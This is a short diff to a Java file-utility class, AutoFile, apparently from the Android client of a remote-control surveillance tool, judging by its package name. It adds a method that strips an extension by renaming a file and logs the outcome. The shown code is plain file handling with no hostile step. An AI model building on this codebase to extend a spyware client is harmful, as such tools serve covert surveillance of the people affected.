@@ -22,7 +22,6 @@ import com.ht.RCSAndroidGUI.utils.Check;
 
 import android.util.Log;
 
-// TODO: Auto-generated Javadoc
 /**
  * The Class AutoFlashFile.
  */
@@ -32,6 +31,7 @@ public final class AutoFile {
 	private static final String TAG = "AutoFile";
 	/** The file. */
 	File file;
+	//String filename;
 
 	/**
 	 * Instantiates a new auto flash file.
@@ -43,6 +43,7 @@ public final class AutoFile {
 	 */
 	public AutoFile(final String filename) {
 		file = new File(filename);
+		//this.filename = filename;
 	}
 
 	/**
@@ -208,5 +209,15 @@ public final class AutoFile {
 	 */
 	public void delete() {
 		file.delete();
+	}
+
+	public void dropExtension(String ext) {
+		String filename = file.getName();
+		int pos = filename.lastIndexOf(ext);
+		String newname = filename.substring(0,pos);
+		File newfile = new File(file.getParent(),newname);
+		boolean ret = file.renameTo(newfile);
+		
+		Log.d(TAG,"renaming file: "+newfile+" ret: "+ret);
 	}
 }
